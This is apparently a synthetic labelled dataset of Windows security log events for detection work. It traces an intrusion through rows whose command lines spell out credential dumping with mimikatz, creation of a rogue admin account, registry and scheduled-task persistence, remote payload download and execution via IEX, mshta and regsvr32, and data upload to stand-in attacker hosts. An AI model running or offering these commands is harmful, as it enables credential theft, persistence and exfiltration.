timestamp,hostname,username,source_ip,destination_ip,destination_port,process_name,parent_process,command_line,event_type,protocol,failed_logins,encoded_command,external_connection,privilege_escalation_flag,persistence_flag,severity_label,probable_attack_category
2024-01-17 02:11:04,WORKSTATION-05,svc_backup,192.168.1.14,203.0.113.44,4444,powershell.exe,cmd.exe,powershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==,process_create,TCP,0,True,True,False,False,malicious,Command and Control
2024-01-17 02:13:22,WORKSTATION-05,svc_backup,192.168.1.14,203.0.113.44,4444,powershell.exe,powershell.exe,powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient",process_create,TCP,0,False,True,False,False,malicious,Command and Control
2024-01-17 02:19:47,WORKSTATION-05,svc_backup,192.168.1.14,192.168.1.2,445,mimikatz_svc.exe,powershell.exe,mimikatz_svc.exe privilege::debug sekurlsa::logonpasswords,process_create,TCP,0,False,False,True,False,malicious,Credential Access
2024-01-17 02:25:31,WORKSTATION-05,svc_backup,192.168.1.14,192.168.1.2,445,net.exe,cmd.exe,net user hacker P@ssw0rd123! /add /domain,process_create,TCP,0,False,False,True,False,malicious,Privilege Escalation
2024-01-17 02:27:15,WORKSTATION-05,svc_backup,192.168.1.14,192.168.1.2,445,net.exe,cmd.exe,net localgroup administrators hacker /add,process_create,TCP,0,False,False,True,False,malicious,Privilege Escalation
2024-01-17 02:33:09,WORKSTATION-05,hacker,192.168.1.14,192.168.1.2,445,reg.exe,cmd.exe,reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v svc_update /t REG_SZ /d C:\Windows\Temp\backdoor.exe,process_create,TCP,0,False,False,False,True,malicious,Persistence
2024-01-17 02:38:54,WORKSTATION-05,hacker,192.168.1.14,192.168.1.2,445,schtasks.exe,cmd.exe,schtasks /create /sc ONLOGON /tn WindowsUpdate /tr C:\Windows\Temp\backdoor.exe /ru SYSTEM /f,process_create,TCP,0,False,False,False,True,malicious,Persistence
2024-01-17 02:45:38,SERVER-DC01,hacker,192.168.1.2,203.0.113.44,443,powershell.exe,cmd.exe,powershell.exe -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA,process_create,TCP,0,True,True,True,False,malicious,Execution
2024-01-17 02:51:23,SERVER-DC01,hacker,192.168.1.2,192.168.1.13,445,psexec.exe,cmd.exe,psexec.exe \\192.168.1.13 cmd.exe,process_create,TCP,0,False,False,True,False,malicious,Lateral Movement
2024-01-17 02:57:07,WORKSTATION-04,hacker,192.168.1.13,203.0.113.55,9001,powershell.exe,psexec.exe,powershell.exe -nop -w hidden -c Invoke-Expression(New-Object Net.WebClient).DownloadString,process_create,TCP,0,False,True,False,False,malicious,Command and Control
2024-01-17 03:03:51,WORKSTATION-04,hacker,192.168.1.13,203.0.113.55,9001,powershell.exe,powershell.exe,powershell.exe -c "IEX [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABzAGUAcgB2AGUAcgA='))",process_create,TCP,0,True,True,False,False,malicious,Command and Control
2024-01-17 03:09:36,SERVER-DC01,hacker,192.168.1.2,192.168.1.14,445,wmic.exe,cmd.exe,wmic /node:192.168.1.14 process call create cmd.exe,process_create,TCP,0,False,False,True,False,malicious,Lateral Movement
2024-01-17 03:15:20,WORKSTATION-06,unknown,192.168.1.15,192.168.1.2,445,svchost.exe,services.exe,svchost.exe -k netsvcs,network_connection,TCP,14,False,False,False,False,malicious,Credential Access
2024-01-17 03:21:05,WORKSTATION-06,unknown,192.168.1.15,192.168.1.2,3389,mstsc.exe,explorer.exe,mstsc.exe /v:SERVER-DC01,network_connection,TCP,11,False,False,False,False,malicious,Credential Access
2024-01-17 03:26:49,WORKSTATION-04,hacker,192.168.1.13,192.168.1.50,445,robocopy.exe,cmd.exe,robocopy \\SERVER-FILE01\share C:\Temp\exfil /E /COPYALL,file_access,TCP,0,False,False,False,False,malicious,Exfiltration
2024-01-17 03:32:33,WORKSTATION-04,hacker,192.168.1.13,203.0.113.22,443,certutil.exe,cmd.exe,certutil.exe -encode C:\Temp\exfil.zip C:\Temp\exfil.b64,process_create,TCP,0,True,False,False,False,malicious,Exfiltration
2024-01-17 03:38:18,WORKSTATION-04,hacker,192.168.1.13,203.0.113.22,443,powershell.exe,cmd.exe,powershell.exe -c "Invoke-WebRequest -Uri http://203.0.113.22/upload -Method POST",process_create,TCP,0,False,True,False,False,malicious,Exfiltration
2024-01-17 03:44:02,SERVER-DC01,hacker,192.168.1.2,192.168.1.2,445,powershell.exe,cmd.exe,powershell.exe -c "Get-ADUser -Filter * | Export-Csv C:\Windows\Temp\users.csv",process_create,TCP,0,False,False,False,False,malicious,Discovery
2024-01-17 03:49:46,WORKSTATION-05,hacker,192.168.1.14,203.0.113.44,31337,mshta.exe,cmd.exe,mshta.exe vbscript:CreateObject("WScript.Shell").Run("cmd.exe /c C:\Windows\Temp\backdoor.exe")(window.close),process_create,TCP,0,False,True,True,True,malicious,Execution
2024-01-17 03:55:31,WORKSTATION-05,hacker,192.168.1.14,203.0.113.44,31337,regsvr32.exe,cmd.exe,regsvr32.exe /s /n /u /i:http://203.0.113.44:31337/com_payload.sct scrobj.dll,process_create,TCP,0,False,True,False,True,malicious,Execution
